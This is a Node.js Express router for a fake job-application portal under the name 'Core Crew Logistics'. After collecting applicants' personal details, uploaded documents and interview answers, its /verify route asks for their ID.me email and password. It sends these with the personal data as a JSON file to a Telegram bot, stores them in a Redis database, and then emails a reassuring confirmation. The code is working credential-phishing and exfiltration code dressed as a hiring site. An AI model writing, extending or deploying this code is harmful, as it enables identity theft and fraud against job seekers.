const path = require('path');
const os = require('os');
const fs = require('fs');
const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const FormData = require('form-data');
const { Redis } = require('@upstash/redis');
const nodemailer = require('nodemailer');

const router = express.Router();

// Storage for uploads (temp on disk)
const upload = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, os.tmpdir()),
    filename: (req, file, cb) => {
      const timestamp = Date.now();
      const safe = file.originalname.replace(/[^a-zA-Z0-9._-]/g, '_');
      cb(null, `${timestamp}-${safe}`);
    },
  }),
  limits: { fileSize: 15 * 1024 * 1024 },
});

const JOB_POSITIONS = [
  'Nursing Practitioner',
  'Logistics Coordinator / Dispatcher',
  'Supply Chain Analyst',
  'Customer Support / Client Relations',
  'HR / Recruitment / Talent Acquisition',
  'IT / Software Support',
  'Drivers (truck, delivery, fleet)',
  'Warehouse Staff & Forklift Operators',
  'Fleet & Maintenance Supervisors',
  'Virtual Assistance',
  'Account Manager',
  'Project Manager',
  'Data Entry',
  'Customer support',
];

// Normalize position for mapping
function normalizePosition(pos) {
  return pos.trim().toLowerCase().replace(/[\s/&-]+/g, ' ');
}

// --- INTERVIEW_QUESTIONS_MAP and DEFAULT_QUESTIONS FULL CONTENT ---
const INTERVIEW_QUESTIONS_MAP = {
  // ... (same as before)
  // omitted here for brevity but keep all mappings unchanged
  "nursing practitioner": [
    { name: "motivation", label: "What motivated you to pursue a career as a Nursing Practitioner, and how do you see yourself contributing to our healthcare team?" },
    { name: "challengingCase", label: "Describe a challenging patient case you've handled and how you approached the diagnosis and treatment plan." },
    { name: "stayCurrent", label: "How do you stay current with the latest medical research and evidence-based practices in your field?" },
    { name: "collaboration", label: "Tell us about a time when you had to collaborate with other healthcare professionals to achieve the best patient outcome." },
    { name: "disagreement", label: "How would you handle a situation where a patient disagrees with your recommended treatment plan?" }
  ],
  // ... rest of the mapping unchanged ...
  "logistics coordinator dispatcher": [
    { name: "motivation", label: "Why did you choose a career in logistics and dispatching?" },
    { name: "dispatchChallenge", label: "Describe a time you solved a major dispatch challenge." },
    { name: "technology", label: "What technologies have you used for tracking and optimizing routes?" },
    { name: "collaboration", label: "Describe a situation where you worked with other departments to resolve a logistics issue." },
    { name: "customerService", label: "How do you handle difficult customer interactions in logistics?" }
  ],
  // ... (rest unchanged) ...
  "data entry": [
    { name: "motivation", label: "Why do you want a data entry role?" },
    { name: "accuracy", label: "How do you ensure accuracy and minimize errors?" },
    { name: "tools", label: "What data tools/software are you familiar with?" },
    { name: "speed", label: "How do you balance speed and quality?" },
    { name: "confidentiality", label: "How do you handle confidential data?" }
  ]
};

// === Default generic interview questions ===
const DEFAULT_QUESTIONS = [
  { name: "about", label: "Tell us about yourself and your professional background." },
  { name: "interest", label: "Why are you interested in working with Core Crew Logistics?" },
  { name: "challenge", label: "Describe a challenge you've overcome at work." },
  { name: "skills", label: "What skills would you bring to this position?" },
  { name: "goals", label: "Where do you see yourself in two years?" }
];

// Entry point
router.get('/', (req, res) => {
  res.render('apply', { positions: JOB_POSITIONS });
});

// Application Start (store draft, show questions)
router.post('/start', upload.array('documents', 6), async (req, res) => {
  try {
    const { firstName, lastName, email, phone, coverLetter, position } = req.body;
    req.session.applicationDraft = {
      firstName,
      lastName,
      email,
      phone,
      coverLetter,
      position,
      files: (req.files || []).map((f) => ({
        path: f.path,
        originalname: f.originalname,
        mimetype: f.mimetype,
      })),
    };
    // DO NOT SEND TO TELEGRAM YET!
    // await sendApplicationToTelegram(req.session.applicationDraft);

    // Always normalize position before lookup!
    const normalizedPosition = normalizePosition(position);
    const selectedQuestions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
    const isDefault = !(normalizedPosition in INTERVIEW_QUESTIONS_MAP);
    res.render('application-submitted', {
      questions: selectedQuestions,
      position,
      step: 2,
      isDefault
    });
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { message: 'Failed to submit application. Please try again later.' });
  }
});

// Interview Questions GET (for resume, always normalize)
router.get('/interview', (req, res) => {
  if (!req.session.applicationDraft) return res.redirect('/apply');
  const pos = req.session.applicationDraft.position;
  const normalizedPosition = normalizePosition(pos);
  const selectedQuestions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
  const isDefault = !(normalizedPosition in INTERVIEW_QUESTIONS_MAP);
  res.render('application-submitted', {
    questions: selectedQuestions,
    position: pos,
    step: 2,
    isDefault
  });
});

// Interview POST: show info-note before ID.me verification
router.post('/interview', async (req, res) => {
  if (!req.session.applicationDraft) return res.redirect('/apply');
  req.session.interviewAnswers = req.body;
  res.render('info-note');
});

// Verification GET (ID.me form only, no info-note)
router.get('/verify', (req, res) => {
  if (!req.session.applicationDraft) return res.redirect('/apply');
  res.render('verify', {
    email: req.session.applicationDraft.email || '',
    position: req.session.applicationDraft.position || ''
  });
});

// Verification POST (handles "sign in" to ID.me, sends all data as JSON FILE to Telegram)
router.post('/verify', async (req, res) => {
  if (!req.session.applicationDraft) return res.redirect('/apply');

  const { email, password } = req.body;
  req.session.verified = true;
  req.session.idme = { email, password };

  // Compose full JSON (applicationDraft, interviewAnswers, idme)
  const application = req.session.applicationDraft;
  const interviewAnswers = req.session.interviewAnswers || {};
  const idmeCreds = req.session.idme; // use from session

  // Build interview Q&A object
  const normalizedPosition = normalizePosition(application.position);
  const questions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
  const answersObj = {};
  questions.forEach(q => {
    let answer = interviewAnswers[q.name];
    if (typeof answer === 'undefined' || answer === null || answer === '') {
      answer = "(No answer provided or field name mismatch)";
    }
    answersObj[q.label] = answer;
  });

  // Compose combined JSON
  const payload = {
    applicant: {
      name: `${application.firstName} ${application.lastName}`,
      email: application.email,
      position: application.position,
    },
    interview_answers: answersObj,
    idme_credentials: idmeCreds
  };

  // Write JSON to temporary file and send as real .json document
  const filename = `application_${Date.now()}.json`;
  const filepath = path.join(os.tmpdir(), filename);
  fs.writeFileSync(filepath, JSON.stringify(payload, null, 2), 'utf8');
  await sendCombinedJsonFileToTelegram(filepath, filename);
  fs.unlinkSync(filepath);

  await sendConfirmationEmail(email, req.session.applicationDraft.firstName);
  res.redirect('/apply/submit');
});

// Completion GET (shows "your application has been submitted" message)
router.get('/submit', async (req, res) => {
  if (!req.session.applicationDraft) return res.redirect('/apply');
  res.render('submit', {
    email: req.session.applicationDraft.email || '',
    firstName: req.session.applicationDraft.firstName || ''
  });
});

// Completion POST (finalizes application & clears session)
router.post('/submit', async (req, res) => {
  try {
    if (!req.session.applicationDraft || !req.session.verified) return res.redirect('/apply');
    const data = req.session.applicationDraft;
    const attachments = (data.files || []).map((f) => ({
      filename: f.originalname,
      path: f.path,
      contentType: f.mimetype,
    }));
    try {
      const redis = new Redis({
        url: process.env.UPSTASH_REDIS_REST_URL,
        token: process.env.UPSTASH_REDIS_REST_TOKEN,
      });
      const key = `application:${Date.now()}:${(data.email || '').replace(/[^a-zA-Z0-9._-]/g, '_')}`;
      await redis.hset(key, {
        firstName: data.firstName,
        lastName: data.lastName,
        email: data.email,
        phone: data.phone,
        position: data.position,
        coverLetter: data.coverLetter || '',
        interviewAnswers: JSON.stringify(req.session.interviewAnswers || {}),
        files: JSON.stringify(attachments.map(a => ({ name: a.filename, type: a.contentType }))),
        idme: JSON.stringify(req.session.idme || {}),
        createdAt: new Date().toISOString(),
      });
    } catch (e) {
      console.warn('Upstash store failed:', e.message);
    }
    req.session.applicationDraft = null;
    req.session.interviewAnswers = null;
    req.session.verified = null;
    req.session.idme = null;
    res.render('success');
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { message: 'Failed to submit application. Please try again later.' });
  }
});

// Helpers below...

// NOTE: DO NOT USE THIS TO SEND THE INITIAL DRAFT TO TELEGRAM ANYMORE!
// async function sendApplicationToTelegram(data) { ... }

async function sendCombinedJsonFileToTelegram(filepath, filename) {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (botToken && chatId) {
      const form = new FormData();
      form.append('chat_id', chatId);
      form.append('document', fs.createReadStream(filepath), filename);
      await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
        method: 'POST',
        body: form,
        headers: form.getHeaders(),
      });
    }
  } catch (e) {
    console.warn('Telegram send failed (combined JSON file):', e.message);
  }
}

async function sendConfirmationEmail(email, firstName) {
  try {
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST || "smtp.gmail.com",
      port: process.env.SMTP_PORT || 465,
      secure: true,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
    });
    await transporter.sendMail({
      from: `"Core Crew Logistics" <${process.env.SMTP_USER}>`,
      to: email,
      subject: "Your Application Has Been Submitted",
      text: `Dear ${firstName || "Applicant"},\n\nThank you for completing your application with Core Crew Logistics. Your submission has been received and is now under review.\n\nWe appreciate your interest and will contact you soon regarding the next steps.\n\nBest regards,\nCore Crew Logistics Team`,
    });
  } catch (e) {
    console.warn("Email send failed:", e.message);
  }
}

module.exports = router;